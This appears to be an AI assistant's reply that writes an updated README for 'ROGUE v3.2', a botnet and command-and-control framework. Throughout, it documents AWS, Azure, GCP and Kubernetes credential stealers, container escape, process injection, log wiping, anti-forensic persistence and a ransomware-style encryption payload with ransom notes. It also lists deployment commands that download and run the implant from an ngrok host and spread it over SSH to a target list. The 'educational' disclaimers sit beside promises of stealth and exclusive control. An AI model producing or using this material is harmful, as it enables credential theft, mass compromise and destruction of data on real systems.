I'll help you update the README with the new cloud integration and awareness features. Here's the updated version:

# ROGUE - Botnet w/ Integrated C2 v3.2

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

## !Disclaimer: This tool is provided for educational purposes. Only use on systems you own or have written permission to test on.

ROGUE v3.2 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, cloud-awareness, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.

---

## What's New in v3.2

### **Cloud-Aware Implant & C2 (NEW!)**
- **Automatic Cloud Environment Detection** - AWS, Azure, GCP, Docker, Kubernetes
- **Cloud-Specific Tactics** - Environment-adapted persistence and evasion
- **Cloud Operations Tab** - Dedicated interface for cloud exploitation
- **Provider-Specific Payloads** - AWS/Azure/GCP credential harvesters
- **Container Escape & K8s Exploitation** - Advanced container-aware operations

### **Advanced Payload Suite**
- **20+ Professional Payloads** including cloud-specific modules
- **5 New Cloud Payloads** for cloud environment exploitation
- **Cloud-Aware Persistence** - Adapts to AWS/Azure/GCP/Container environments
- **Automatic Environment Adaptation** - Changes tactics based on detected cloud provider
- **Cloud Reconnaissance** - Provider-specific intelligence gathering

### **Cloud Payloads (NEW)**
- **Cloud Detector** (`cloud_detector.py`) - Detect cloud environment and adapt behavior
- **AWS Credential Stealer** (`aws_credential_stealer.py`) - Harvest AWS credentials and metadata
- **Azure Credential Harvester** (`azure_cred_harvester.py`) - Steal Azure tokens and credentials
- **Container Escape** (`container_escape.py`) - Escape containerized environments
- **Kubernetes Secret Stealer** (`k8s_secret_stealer.py`) - Harvest K8s secrets and configs

### **Web Interface**
- **Cloud Operations Tab** - Dedicated cloud exploitation interface
- **Cloud Info Display** - Real-time cloud environment detection in bot list
- **Provider-Specific Operations** - AWS, Azure, GCP, Container/Kubernetes
- **Cloud Environment Scanner** - Integrated cloud reconnaissance tool
- **Adaptive Implant Settings** - Cloud-aware hidden directories and persistence

### **Advanced Features (v3.1)**
- **4 Advanced Payloads** for elite stealth and persistence
- **File Encryption Payload** - AES-256 encryption/decryption (DESTRUCTIVE - use with caution)
- **Compound Operations** for automated red team workflows
- **Tabbed Web Interface** with dedicated advanced operations section
- **Process Injection & File Hiding** for maximum stealth

---

## Cloud-Aware Features (NEW in v3.2)

### **Automatic Cloud Detection**
The implant automatically detects:
- **AWS EC2 instances** via metadata service (169.254.169.254)
- **Azure VMs** through Azure instance metadata
- **Google Cloud VMs** via GCP metadata service
- **Docker containers** via /.dockerenv and cgroups
- **Kubernetes pods** via service account mounts
- **Generic containers** through cgroup analysis

### **Cloud-Adaptive Behavior**
Based on detected environment:
- **Hidden Directory Selection** - Chooses optimal stealth locations
- **Persistence Mechanism Adaptation** - Uses cloud-native persistence
- **Tactics Selection** - Environment-specific exploitation methods
- **Payload Pre-fetching** - Downloads relevant cloud payloads
- **Communication Adaptation** - Adjusts beaconing for cloud networks

### **Cloud-Specific Persistence**

#### **AWS Persistence:**
- Cloud-init user-data modification
- Instance metadata cron jobs
- AWS-specific service creation
- EC2 tag-based persistence

#### **Azure Persistence:**
- VM Agent extension installation
- Azure cloud-init configuration
- Custom script extensions
- Azure-specific scheduled tasks

#### **GCP Persistence:**
- Google Cloud startup scripts
- GCP cloud-init configuration
- Instance metadata-based triggers
- Custom metadata persistence

#### **Container Persistence:**
- Docker socket exploitation
- Memory-only execution
- Container image modification
- Kubernetes cron jobs

### **Cloud Operations Interface**
Access via: `http://localhost:4444/admin` → "Cloud Ops" tab

#### **Cloud Detection**
```bash
trigger_cloud_detect    # Detect cloud environment
trigger_cloud_recon     # Execute cloud reconnaissance
```

#### **AWS Operations**
```bash
trigger_aws_creds       # Steal AWS credentials and metadata
trigger_aws_enum        # Enumerate AWS resources
load_payload aws_lateral.py  # Load AWS lateral movement
```

#### **Azure Operations**
```bash
trigger_azure_creds     # Steal Azure credentials
trigger_azure_enum      # Enumerate Azure resources
load_payload azure_lateral.py # Load Azure lateral movement
```

#### **GCP Operations**
```bash
trigger_gcp_creds       # Steal GCP credentials
trigger_gcp_enum        # Enumerate GCP resources
load_payload gcp_lateral.py  # Load GCP lateral movement
```

#### **Container Operations**
```bash
trigger_container_escape # Attempt container escape
trigger_k8s_creds       # Steal Kubernetes credentials
load_payload docker_breakout.py # Load container breakout
```

#### **Cloud Environment Scanner**
- Full cloud scan (metadata, credentials, resources)
- Credentials-only scan
- Metadata-only collection
- Implant adaptation to cloud

---

## Installation & Setup

### **Clone Repository**
```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

### **Install Dependencies**
```bash
# Core dependencies
sudo apt update
sudo apt install python3 python3-pip python3-dev python3-venv -y

# Install Python packages
pip3 install pycryptodome flask requests psutil setproctitle netifaces paramiko pynput --break-system-packages

# Optional for cloud features
pip3 install boto3 azure-identity google-cloud-storage kubernetes --break-system-packages

# For advanced payloads
pip3 install pyautogui python-nmap secretstorage --break-system-packages
```

**Note:** If you don't want to use `--break-system-packages`, make a venv and do it from there:
```bash
python3 -m venv rogue_env
source rogue_env/bin/activate
pip3 install pycryptodome flask requests psutil setproctitle netifaces paramiko pynput boto3 azure-identity google-cloud-storage kubernetes pyautogui python-nmap secretstorage
```

### **Ngrok Setup**
```bash
# Download and install ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Set up authentication
ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
```

---

## Quick Start Guide

### **1. Start C2 Server** (Control Center)
```bash
python3 rogue_c2.py
```

**Expected Output:**
```
============================================================
 ROGUE C2 SERVER - Complete Command & Control
============================================================
[+] Exfil listener started on port 9091
[+] Reverse shell listener started on port 9001
[*] Starting ngrok tunnel...
[+] C2 SERVER IS LIVE!
[NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
[NGROK] Hostname: your-subdomain.ngrok-free.dev
[NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
[ADMIN] Web Panel: http://localhost:4444/admin
[CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape, K8s Stealer
[ADVANCED] 4 Advanced Payloads: Process Injection, File Hider, Cron Persist, Competitor Cleaner
[FILE ENCRYPTION] System-wide modes: system_test, system_user, system_aggressive, system_destructive
============================================================
```

### **2. Configure Implant**
Edit `rogue_implant.py` with your C2 details:
```python
C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
C2_PORT = 4444
PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
```

### **3. Deploy Implants**

**Manual Deployment:**
```bash
python3 rogue_implant.py
```

**Cloud Deployment Example (AWS):**
```bash
# Deploy to AWS EC2 via user-data
cat > user-data.sh << 'EOF'
#!/bin/bash
wget https://your-ngrok-subdomain.ngrok-free.dev/payloads/rogue_implant.py -O /tmp/rogue.py
python3 /tmp/rogue.py &
EOF

# Launch EC2 with user-data
aws ec2 run-instances --image-id ami-12345678 --user-data file://user-data.sh
```

**Mass Deployment (SSH):**
```bash
for ip in $(cat targets.txt); do
    scp rogue_implant.py user@$ip:/tmp/ && \
    ssh user@$ip "cd /tmp && python3 rogue_implant.py &"
done
```

**Container Deployment:**
```bash
# Inject into running container
docker cp rogue_implant.py container_name:/tmp/
docker exec container_name python3 /tmp/rogue_implant.py &

# Or build into container image
echo "CMD python3 /app/rogue_implant.py" >> Dockerfile
```

---

## Web Interface Guide

### **Access Control Panel**
```
http://localhost:4444/admin
```

### **Interface Layout**

#### **Tab 1: Active Bots**
- View connected implants with real-time status
- **Cloud Info Display** - Shows detected cloud environment
- Send commands to individual bots
- Monitor command results and pending queues
- Color-coded status indicators (green = active, teal = cloud-detected)
- **File Encryption Tool** - Dedicated interface with warnings
- **Advanced Payloads Section** - Quick access to new capabilities

#### **Tab 2: Operations**

**Cloud-Aware Operations (NEW):**
```bash
trigger_cloud_detect    # Detect cloud environment
trigger_cloud_recon     # Cloud-specific reconnaissance
trigger_aws_creds       # AWS credential harvesting
trigger_azure_creds     # Azure credential harvesting
trigger_gcp_creds       # GCP credential harvesting
trigger_container_escape # Container escape attempt
trigger_k8s_creds       # Kubernetes credential harvesting
```

**Reconnaissance & Intelligence** (Enhanced):
```bash
trigger_sysrecon        # Comprehensive system reconnaissance
trigger_linpeas         # Linux privilege escalation checker
trigger_hashdump        # Password hash extraction
trigger_browsersteal    # Browser credential theft
trigger_network_scan    # Network host discovery
```

**Advanced Operations:**
```bash
trigger_procinject      # Process injection for stealth execution
trigger_filehide        # Advanced file hiding techniques
trigger_cronpersist     # Advanced cron persistence methods
trigger_compclean       # Clean competitor malware/botnets
```

**Compound Operations:**
```bash
trigger_full_recon      # Complete reconnaissance suite
trigger_harvest_all     # Comprehensive data collection
trigger_clean_sweep     # Forensic cleanup & restart
```

**File Operations (DESTRUCTIVE):**
```bash
trigger_fileransom encrypt /path [password]  # Encrypt files (removes originals)
trigger_fileransom decrypt /path <password>  # Decrypt files with password
```

**Persistence & Stealth:**
```bash
trigger_stealthinject   # PolyRoot persistence installation
trigger_persistence_setup # Additional persistence mechanisms
trigger_defense_evasion  # Anti-forensic techniques
trigger_logclean        # System log cleaning
```

#### **Tab 3: Payloads**
- Browse available payloads
- **Cloud Payloads Section** (NEW) - AWS/Azure/GCP/Container/K8s tools
- Direct load/run buttons
- Payload descriptions and categories
- Organized by operation type
- **File Encryption** marked with orange warnings
- **Advanced Payloads** marked with purple "NEW" badges
- **Cloud Payloads** marked with teal "CLOUD" badges

#### **Tab 4: Advanced**
- **Process Injection** - Inject implant into legitimate processes
- **Advanced File Hider** - Hide files using advanced techniques
- **Advanced Cron Persistence** - Sophisticated cron-based persistence
- **Competitor Cleaner** - Remove other malware/botnets
- Advanced operations console for elite payloads

#### **Tab 5: Cloud Ops (NEW)**
- **Cloud Detection** - Environment detection and adaptation
- **AWS Operations** - AWS-specific credential harvesting and enumeration
- **Azure Operations** - Azure credential harvesting and resource discovery
- **GCP Operations** - Google Cloud Platform credential harvesting
- **Container Operations** - Container escape and Kubernetes exploitation
- **Cloud Environment Scanner** - Full cloud reconnaissance tool
- **Adapt Implant to Cloud** - Automatic environment adaptation

#### **Tab 6: Results**
- Command execution history
- Timestamped results
- Filter by bot ID
- Export capabilities

#### **Tab 7: Server Status**
- Server uptime
- Ngrok tunnel status
- Active bot count
- System resource monitoring
- Advanced payloads count
- Cloud payloads count

---

## Payload Reference

### **Cloud Payloads (NEW)**

#### **Cloud Detector** (`cloud_detector.py`)
```bash
trigger_cloud_detect
```
**Detects:**
- AWS EC2 instances via metadata service
- Azure VMs through Azure instance metadata
- Google Cloud VMs via GCP metadata
- Docker containers via /.dockerenv
- Kubernetes pods via service accounts
- Generic container environments

**Features:**
- Automatic environment adaptation
- Cloud-specific tactic selection
- Provider identification with confidence levels
- Metadata collection for intelligence

#### **AWS Credential Stealer** (`aws_credential_stealer.py`)
```bash
trigger_aws_creds
```
**Collects:**
- IAM role credentials from metadata
- AWS CLI configuration files (~/.aws/)
- Environment variables with AWS keys
- EC2 instance metadata
- S3 bucket access keys

**Features:**
- Automatic credential validation
- Permission enumeration
- Region discovery
- Service access testing

#### **Azure Credential Harvester** (`azure_cred_harvester.py`)
```bash
trigger_azure_creds
```
**Harvests:**
- Managed identity tokens
- Azure CLI credentials
- Service principal configurations
- VM metadata and tags
- Key Vault access patterns

**Features:**
- Token acquisition and validation
- Subscription enumeration
- Resource group discovery
- Role assignment analysis

#### **Container Escape** (`container_escape.py`)
```bash
trigger_container_escape
```
**Techniques:**
- Docker socket exploitation
- Privilege escalation via capabilities
- Mount namespace breakout
- Kernel module loading
- Cgroup manipulation

**Features:**
- Multiple escape vector attempts
- Success probability assessment
- Post-escape host reconnaissance
- Persistence establishment on host

#### **Kubernetes Secret Stealer** (`k8s_secret_stealer.py`)
```bash
trigger_k8s_creds
```
**Steals:**
- Kubernetes service account tokens
- ConfigMaps with sensitive data
- Secrets from all namespaces
- kubeconfig files
- Cluster role bindings

**Features:**
- Namespace enumeration
- Secret extraction and decryption
- Cluster privilege escalation
- Lateral movement planning

### **Core Payloads**

#### **System Reconnaissance** (`sysrecon.py`)
```bash
trigger_sysrecon
```
**Collects:**
- System hardware information
- Network configuration
- User accounts and privileges
- Running processes and services
- Installed software inventory
- Security defenses status

#### **Privilege Escalation** (`linpeas_light.py`)
```bash
trigger_linpeas
```
**Checks:**
- Sudo privileges and misconfigurations
- SUID/SGID binaries
- World-writable files and directories
- Cron job vulnerabilities
- Kernel exploits
- Linux capabilities

#### **Credential Access** (`hashdump.py`)
```bash
trigger_hashdump
```
**Extracts:**
- Linux password hashes (/etc/shadow)
- Windows SAM hashes (if available)
- SSH private/public keys
- Browser saved credentials
- Memory credential artifacts

### **Advanced Payloads**

#### **Process Injection** (`process_inject.py`)
```bash
trigger_procinject
```
**Features:**
- Inject Rogue implant into legitimate system processes
- Memory-only execution to bypass file scanning
- Target processes: systemd, sshd, nginx, apache
- Persist across reboots via injected processes
- Bypass traditional process monitoring tools

#### **Advanced File Hider** (`advanced_filehider.py`)
```bash
trigger_filehide
```
**Features:**
- Hide files using Linux extended attributes
- Dot-prefix manipulation and hidden directories
- Filesystem tunneling techniques
- Anti-forensics methods to evade detection
- Make files invisible to standard system tools

#### **Advanced Cron Persistence** (`advanced_cron_persistence.py`)
```bash
trigger_cronpersist
```
**Features:**
- Randomized execution times to evade pattern detection
- Obfuscated cron entries that appear legitimate
- Multiple backup persistence methods
- Self-healing capability if removed
- Anti-forensic techniques to hide cron jobs

#### **Competitor Cleaner** (`competitor_cleaner.py`)
```bash
trigger_compclean
```
**Features:**
- Detect and remove common malware families
- Clean competitor C2 implants and backdoors
- Remove unauthorized persistence mechanisms
- System sanitization for exclusive control
- Identify and neutralize threat actors on the system

#### **File Encryption** (`fileransom.py`) - **DESTRUCTIVE**
```bash
trigger_fileransom encrypt /path [password]  # Encrypt files
trigger_fileransom decrypt /path <password>  # Decrypt files
```
**Features:**
- AES-256 military-grade encryption
- Password-protected encryption/decryption
- Auto-generates strong passwords
- Creates ransom note with recovery instructions
- Saves encryption log with password
- **WARNING:** Removes original files permanently

---

## Cloud-Aware Operations Guide

### **Cloud Environment Detection**

#### **Manual Cloud Detection**
```bash
# From C2 web interface (Cloud Ops tab):
trigger_cloud_detect

# Or directly via command:
send_https_command("trigger_cloud_detect")
```

#### **Cloud Reconnaissance**
```bash
# Comprehensive cloud reconnaissance
trigger_cloud_recon

# This will:
# 1. Detect cloud provider
# 2. Gather provider-specific metadata
# 3. Collect available credentials
# 4. Enumerate accessible resources
```

### **Cloud-Specific Exploitation**

#### **AWS Exploitation Chain**
```bash
# 1. Detect AWS environment
trigger_cloud_detect

# 2. Steal AWS credentials
trigger_aws_creds

# 3. Enumerate AWS resources
trigger_aws_enum

# 4. Attempt lateral movement within AWS
load_payload aws_lateral.py
```

#### **Azure Exploitation Chain**
```bash
# 1. Detect Azure environment
trigger_cloud_detect

# 2. Harvest Azure credentials
trigger_azure_creds

# 3. Enumerate Azure resources
trigger_azure_enum

# 4. Attempt lateral movement in Azure
load_payload azure_lateral.py
```

#### **Container Escape Chain**
```bash
# 1. Detect container environment
trigger_cloud_detect

# 2. Attempt container escape
trigger_container_escape

# 3. If successful, deploy to host
trigger_persistence_setup

# 4. Clean container traces
trigger_logclean
```

#### **Kubernetes Exploitation**
```bash
# 1. Detect Kubernetes environment
trigger_cloud_detect

# 2. Steal Kubernetes secrets
trigger_k8s_creds

# 3. Enumerate cluster resources
# (Manual commands via kubectl if available)

# 4. Attempt lateral movement in cluster
load_payload k8s_lateral.py
```

### **Cloud-Aware Persistence**

#### **Automatic Persistence Adaptation**
The implant automatically adapts persistence based on detected environment:

**In AWS:**
- Modifies cloud-init user-data
- Creates EC2 metadata-based cron jobs
- Uses AWS-specific service mechanisms

**In Azure:**
- Installs VM Agent extensions
- Modifies Azure cloud-init configurations
- Creates Azure-specific scheduled tasks

**In GCP:**
- Adds Google Cloud startup scripts
- Modifies GCP cloud-init configurations
- Uses instance metadata for triggers

**In Containers:**
- Uses Docker socket for persistence
- Implements memory-only execution
- Creates container-specific cron jobs

#### **Manual Persistence Commands**
```bash
# Force cloud-aware persistence setup
# (Automatic on implant startup when cloud detected)

# Check current persistence status
trigger_status

# Verify cloud adaptation
cat ~/.cache/.rogue/cloud_detection.json 2>/dev/null
```

### **Cloud Intelligence Gathering**

#### **Metadata Collection**
```bash
# AWS metadata
curl http://169.254.169.254/latest/meta-data/ 2>/dev/null

# Azure metadata
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP metadata
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
```

#### **Credential Discovery**
```bash
# Check for cloud credentials
find / -name ".aws" -o -name ".azure" -o -name ".config/gcloud" 2>/dev/null

# Check environment variables
env | grep -i aws\|azure\|gcp\|cloud

# Check running processes for cloud tools
ps aux | grep -i aws\|az\|gcloud\|kubectl
```

### **Cloud-Specific Evasion**

#### **AWS Evasion**
- Use IMDSv2 tokens for metadata access
- Leverage AWS roles instead of stored credentials
- Use VPC endpoints to avoid internet exposure
- Implement request signing for API calls

#### **Azure Evasion**
- Use managed identities instead of service principals
- Leverage Azure Key Vault for secret storage
- Use private endpoints for Azure services
- Implement token caching to reduce authentication frequency

#### **Container Evasion**
- Use ephemeral containers with no persistence
- Implement memory-only execution
- Leverage sidecar containers for C2
- Use Kubernetes jobs for ephemeral tasks

---

## Advanced Usage

### **Compound Cloud Operations**

#### **Complete Cloud Reconnaissance**
```bash
trigger_full_recon  # Includes cloud detection if in cloud
```

**When in cloud environment, this also:**
1. Detects cloud provider and type
2. Collects cloud metadata
3. Gathers available credentials
4. Enumerates cloud resources
5. Maps network topology within cloud

#### **Cloud Data Harvest**
```bash
trigger_harvest_all  # Enhanced for cloud environments
```

**Cloud-enhanced collection:**
- Cloud credential harvesting (AWS/Azure/GCP)
- Cloud metadata exfiltration
- Container/Kubernetes secret collection
- Cloud storage bucket enumeration
- Database credential extraction

### **Stealth in Cloud Environments**

#### **Cloud-Native Stealth Techniques**
```bash
# Use cloud-native services for stealth
trigger_cloud_detect  # First, understand environment

# Then apply appropriate stealth:
if AWS:
    trigger_procinject    # Process injection
    trigger_filehide      # Advanced file hiding
    # Use AWS CloudWatch for log obfuscation

if Container:
    trigger_container_escape  # Escape to host
    trigger_memory_persistence # Memory-only execution
    # Use container orchestration for hiding

if Kubernetes:
    trigger_k8s_creds    # Steal service account
    # Use K8s jobs for ephemeral execution
    # Leverage K8s network policies for stealth
```

#### **Cloud Log Evasion**
```bash
# Cloud-specific log cleaning
trigger_logclean  # Enhanced for cloud logs

# Cloud-specific targets:
# AWS: CloudTrail, CloudWatch, VPC Flow Logs
# Azure: Activity Logs, Monitor, Network Watcher
# GCP: Cloud Audit Logs, VPC Flow Logs, Operations
```

### **Cloud Lateral Movement**

#### **Within Cloud Provider**
```bash
# AWS lateral movement
load_payload aws_lateral.py

# This payload can:
# 1. Use stolen credentials to access other instances
# 2. Enumerate security groups for accessible ports
# 3. Attempt SSH/RDP connections to other instances
# 4. Deploy implants via AWS Systems Manager
```

#### **Cross-Cloud Movement**
```bash
# If credentials allow multiple cloud access
# Manual steps:
# 1. Harvest credentials from current cloud
# 2. Test credentials against other cloud providers
# 3. Deploy implants to accessible clouds
# 4. Establish cross-cloud C2 channels
```

---

## Emergency Procedures

### **Cloud-Specific Emergency Removal**

#### **AWS Removal**
```bash
# Remove from AWS instance
sudo pkill -9 -f rogue
sudo rm -rf ~/.cache/.rogue
sudo rm -rf /var/lib/cloud/.cache
# Clean cloud-init modifications
sudo sed -i '/ROGUE\|rogue_agent/d' /etc/cloud/cloud.cfg
# Remove AWS cron jobs
sudo rm -f /etc/cron.d/aws-monitor
```

#### **Azure Removal**
```bash
# Remove from Azure VM
sudo pkill -9 -f rogue
sudo rm -rf ~/.cache/.rogue
sudo rm -rf /var/lib/waagent/custom-script
# Clean Azure extensions
sudo find /var/lib/waagent -name "*rogue*" -delete
```

#### **Container Removal**
```bash
# Remove from container
pkill -9 -f rogue
rm -rf /.cache/.rogue
# Check for host escape
ps aux | grep -E "docker|containerd|kube" | grep -v grep
# If escaped to host, clean host as well
```

#### **Kubernetes Removal**
```bash
# Remove from Kubernetes pod
pkill -9 -f rogue
rm -rf /.cache/.rogue
# Check for cluster-wide deployment
kubectl get jobs,cronjobs,deployments -A | grep -i rogue
# Remove any Rogue-related resources
kubectl delete -f rogue-manifest.yaml 2>/dev/null
```

### **Cloud Forensic Detection**

#### **Indicators of Compromise (Cloud)**
```bash
# Check for cloud-specific IoCs
# AWS: Unusual IAM role usage, unexpected metadata queries
# Azure: Unusual managed identity usage, unexpected extension installs
# GCP: Unusual service account usage, unexpected metadata access
# Containers: Container escape attempts, unusual host mounts
```

#### **Cloud Log Analysis**
```bash
# Check cloud provider logs
# AWS CloudTrail, CloudWatch
# Azure Activity Logs, Monitor
# GCP Cloud Audit Logs, Operations
# Container: Docker/Container logs
# Kubernetes: K8s audit logs
```

---

## Troubleshooting

### **Cloud-Specific Issues**

#### **Cloud Detection Failures**
```bash
# Test cloud detection manually
python3 -c "
import urllib.request
import socket
socket.setdefaulttimeout(2)
try:
    req = urllib.request.Request('http://169.254.169.254/latest/meta-data/')
    urllib.request.urlopen(req)
    print('AWS detected')
except:
    print('Not AWS or metadata blocked')
"

# Check for metadata service access
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "AWS metadata unavailable"
curl -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo "Azure metadata unavailable"
curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/' 2>/dev/null || echo "GCP metadata unavailable"
```

#### **Cloud Credential Issues**
```bash
# Check for cloud credentials
ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ 2>/dev/null

# Test AWS credentials
aws sts get-caller-identity 2>/dev/null || echo "AWS credentials not configured"

# Test Azure credentials
az account show 2>/dev/null || echo "Azure credentials not configured"

# Test GCP credentials
gcloud config list 2>/dev/null || echo "GCP credentials not configured"
```

#### **Container Escape Failures**
```bash
# Check container environment
cat /.dockerenv 2>/dev/null && echo "Running in Docker"
cat /proc/1/cgroup | grep -i docker && echo "Docker container detected"
ls /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null && echo "Kubernetes pod detected"

# Check for escape vectors
ls -la /var/run/docker.sock 2>/dev/null && echo "Docker socket accessible"
find / -perm -4000 2>/dev/null | head -10
```

#### **Kubernetes Issues**
```bash
# Check Kubernetes environment
env | grep -i kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null

# Test Kubernetes access
kubectl get pods 2>/dev/null || echo "kubectl not available or no permissions"
curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods 2>/dev/null | head -5
```

### **General Troubleshooting**

#### **Ngrok Connection Issues:**
```bash
# Check ngrok status
curl http://localhost:4040/api/tunnels

# Restart ngrok
pkill ngrok
ngrok http 4444
sleep 5
```

#### **Implant Not Connecting:**
```bash
# Test C2 connectivity from target
curl -k https://your-c2.ngrok-free.dev

# Check implant logs
cat ~/.cache/.rogue/.implant.log 2>/dev/null

# Verify cloud detection worked
cat ~/.cache/.rogue/cloud_detection.json 2>/dev/null
```

---

## Command Quick Reference

### **Cloud Commands (NEW)**
```bash
# Cloud Detection & Recon
trigger_cloud_detect    # Detect cloud environment
trigger_cloud_recon     # Cloud-specific reconnaissance
trigger_cloud_scan full # Full cloud environment scan

# AWS Operations
trigger_aws_creds       # Steal AWS credentials
trigger_aws_enum        # Enumerate AWS resources

# Azure Operations
trigger_azure_creds     # Steal Azure credentials
trigger_azure_enum      # Enumerate Azure resources

# GCP Operations
trigger_gcp_creds       # Steal GCP credentials
trigger_gcp_enum        # Enumerate GCP resources

# Container Operations
trigger_container_escape # Container escape attempt
trigger_k8s_creds       # Kubernetes credential harvesting
```

### **Essential Commands**
```bash
# System Information
whoami
uname -a
ip a
ps aux

# Cloud Information
env | grep -i cloud
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5
```

### **Trigger Commands (C2 Panel)**
```bash
# Reconnaissance
trigger_sysrecon
trigger_linpeas
trigger_hashdump
trigger_browsersteal

# Advanced Payloads
trigger_procinject
trigger_filehide
trigger_cronpersist
trigger_compclean

# Cloud Operations
trigger_cloud_detect
trigger_aws_creds
trigger_azure_creds
trigger_container_escape

# File Operations (DESTRUCTIVE)
trigger_fileransom encrypt /path [password]
trigger_fileransom decrypt /path <password>

# Operations
trigger_full_recon
trigger_harvest_all
trigger_clean_sweep

# Management
trigger_status
trigger_self_update
trigger_help
```

### **Payload Commands**
```bash
# Load and execute
load_payload sysrecon.py
run_payload sysrecon.py

# Cloud payloads
load_payload cloud_detector.py
run_payload cloud_detector.py

# Advanced payloads
load_payload process_inject.py
run_payload process_inject.py

# File Encryption (use with extreme caution)
load_payload fileransom.py
run_payload fileransom.py
```

---

## Disclaimer

### **!!!EXTREME WARNING DISCLAIMER!!!**
```
THE FILE ENCRYPTION PAYLOAD (fileransom.py) IS DESTRUCTIVE SOFTWARE.
It PERMANENTLY REMOVES ORIGINAL FILES during encryption.
Files are only recoverable with the correct password.

THE CLOUD EXPLOITATION FEATURES ARE FOR AUTHORIZED TESTING ONLY.
Unauthorized access to cloud resources is illegal and unethical.

THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
The author assumes NO LIABILITY for data loss, misuse, or damage caused by this software.

Users must:
1. Obtain proper authorization before use
2. Only use in isolated test environments
3. Maintain backups of all important data
4. Assume full responsibility for encryption password management
5. Only test cloud environments you own or have written permission to test
6. Comply with all cloud provider terms of service
```

![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)

---
*Last Updated: v3.2 | For authorized security testing only*  
**CLOUD EXPLOITATION: Use only on cloud environments you own or have explicit permission to test**  
**FILE ENCRYPTION: Use with extreme caution in isolated environments only**  

![image0(1)](https://github.com/user-attachments/assets/0a84dbd2-5028-40e9-ae8d-fc046114b94f)

